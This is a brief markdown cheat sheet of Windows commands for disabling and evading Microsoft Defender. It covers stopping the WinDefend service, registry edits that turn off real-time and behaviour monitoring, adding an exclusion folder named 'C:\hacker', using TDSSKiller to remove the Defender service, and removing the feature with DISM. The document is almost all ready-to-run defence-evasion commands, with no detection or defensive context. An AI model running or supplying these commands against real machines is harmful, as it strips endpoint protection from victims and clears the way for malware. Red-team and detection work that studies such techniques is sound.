# (Mis)configuring Windows Defender

## Disabling Windows Defender
### Service
    net stop “WinDefend”
    sc config “WinDefend” start=disabled

### Registry (see also [https://gist.github.com/pe3zx](https://gist.github.com/pe3zx))

    reg add “HKLM\System\CurrentControlSet\Services\WinDefend” /v “Start” /t REG_DWORD /d “4” /f
    reg add “HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection” /v “DisableBehaviorMonitoring” /t REG_DWORD /d “1” /f
    reg add “HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection” /v “DisableIOAVProtection” /t REG_DWORD /d “1” /f
    reg add “HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection” /v “DisableAccessProtection” /t REG_DWORD /d “1” /f
    reg add “HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection” /v “DisableRealtimeMonitoring” /t REG_DWORD /d “1” /f
    reg add “HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection” /v “DisableScanOnRealtimeEnable” /t REG_DWORD /d “1” /f

## Configuring exclusions
    wmic /namespace:\\root\microsoft\windows\defender path msft_mppreference call add exclusionpath=”C:\hacker\”
    powershell.exe -c Add-MpPreference -ExclusionPath “C:\hacker”

## Bypassing Windows Defender and EDR with an Anti-Rootkit Tool (TDSSKiller)
    TDSSKiller - https://www.bleepingcomputer.com/download/tdsskiller/
    tdsskiller.exe -accepteula -silent -dcsvc WinDefend

## Using DISM to Deactivate Windows Defender
    Deployment Image Servicing and Management (DISM.exe) 
    dism /online /Disable-Feature /FeatureName:Windows-Defender /remove /NoRestart /quiet